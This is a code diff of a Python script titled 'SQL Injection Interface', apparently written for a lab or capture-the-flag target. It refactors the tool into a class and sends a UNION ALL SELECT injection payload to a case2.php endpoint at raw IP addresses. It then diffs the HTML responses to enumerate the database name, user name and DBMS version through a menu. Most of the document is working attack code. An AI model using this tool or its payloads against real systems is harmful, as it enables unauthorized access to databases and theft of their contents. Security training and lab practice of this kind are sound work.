@@ -29,7 +29,7 @@ def get_sqli_info(payload):
 def add_values_to_data_payload(raw_values, payload):
     values = raw_values.split()
     payload['value'] = values
-    print(payload)
+    return payload
 
 def get_request(url):
     response  = requests.get(url)
@@ -80,20 +80,30 @@ def html_diff(text1, text2):
     return " ".join(different_words)
 
 
-url = "http://"+"83.136.253.5:51945/case2.php"
+#INITIAL VARIABLES
+class SQLI:
+    def __init__(self, url, payload, sqli_payload):
+        self.url = url
+        self.payload = payload
+        self.sqli_payload = sqli_payload
+        self.headers = read_headers_file("./headers.txt")
+        self.data = get_sqli_info(sqli_payload)
+
+url = "http://"+"94.237.53.219:39961/case2.php"
 headers = read_headers_file("./headers.txt")
 payload = {"id": "1"}
-test = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
+sqli_payload = "id=1 UNION ALL SELECT NULL,NULL,payload,NULL,NULL,NULL,NULL,NULL,NULL source -- -"
+sqli = SQLI(url, payload, sqli_payload) # GLOBAL OBJECT
 
 #WORKING CODE
 """
 response1 = post_request(url, payload, headers).text
 
 
-payload = string_to_json(test)
+payload = string_to_json(sqli_payload)
 response2 = post_request(url, payload, headers).text # Payload OK
 
-aux_payloads = get_sqli_info(test)
+aux_payloads = get_sqli_info(sqli_payload)
 database_payload = string_to_json(aux_payloads[0]['payload'])
 response3 = post_request(url, database_payload, headers).text
 result = html_diff(response1,response3)
@@ -102,37 +112,72 @@ add_values_to_data_payload(result, aux_payloads[0])
 """
 
 #------------
-def menu(option):
-    global url, payload, test
+def set_database_names(sqli, data_index=0):
+    try:
+        response1 = post_request(sqli.url, sqli.payload, sqli.headers).text
+        aux_payloads = get_sqli_info(sqli.sqli_payload)
+        database_payload = string_to_json(aux_payloads[data_index]['payload'])
+        response2 = post_request(sqli.url, database_payload, sqli.headers).text
+        result = html_diff(response1,response2)
+        value = add_values_to_data_payload(result, aux_payloads[data_index])
+        sqli.data[data_index] = value
+        print(f"\033[32mValue found: \033[37m{sqli.data[data_index]['value']}\033[0m")
+        return sqli
+    except requests.RequestException as e:
+        print(f"\033[31mError during request: {e}\033[0m")
+        return sqli
+
+def menu(option, sqli):
+    result = 0
     if option == 0:
-        return 0
+        return result
     elif option == 10:
         new_url = str(input("New url:\t\033[0m"))
-        url = new_url
-    run()
+        sqli.url = new_url
+    elif option == 11:
+        new_payload = str(input("New payload (key=value):\t\033[0m"))
+        sqli.payload = string_to_json(new_payload)
+    elif option == 20:
+        try:
+            sqli.data[0] = set_database_names(sqli).data[0]
+        except Exception as e:
+            print(f"\033[31mError setting database names: {e}\033[0m")
+            result = -1 
+    elif option == 21:
+        sqli.data[1] = set_database_names(sqli,1).data[1]
+    elif option == 22:
+        sqli.data[2] = set_database_names(sqli,2).data[2]
+    if result == 0:
+        run(sqli)
 
-def run():
+def run(sqli):
     print("\nWelcome to your SQL Injection Interface\n")
     print(f"\033[32m--------------\n|\
-    URL:\033[37m\t\t{url}\033[32m\n|\
-    Vulnerable param:\t\033[37m{payload}\033[32m\n|\
-    SQLi Payload:\t\033[31m{test}\033[32m")
+    URL:\033[37m\t\t{sqli.url}\033[32m\n|\
+    Vulnerable param:\t\033[37m{sqli.payload}\033[32m\n|\
+    SQLi Payload:\t\033[31m{sqli.sqli_payload}\033[32m")
+    
     print("-------------\n")
     
     print("\033[36mENUMERATION")
     print(f"--------------")
-    enumeration_data = get_sqli_info(test)
-    for data in enumeration_data:
+    for data in sqli.data:
         print(f"|\t{data['data']}:\t\033[37m{data['value']}\033[36m")
     print(f"--------------")
 
     print("\033[33mOPTIONS")
     print(f"--------------")
     print("10)\tSet URL")
-    print("11)\tSet Payload")
+    print("11)\tSet Payload\n")
+    print("20)\tGet Database Name")
+    print("21)\tGet User Name")
+    print("22)\tGet DBMS Version")
     print("\n0) Exit")
     
     option = int(input("Choose option:\t"))
-    menu(option)
+    menu(option, sqli)
 
-run()
+def main ():
+    sqli = SQLI(url, payload, sqli_payload)
+    run(sqli)
+main()
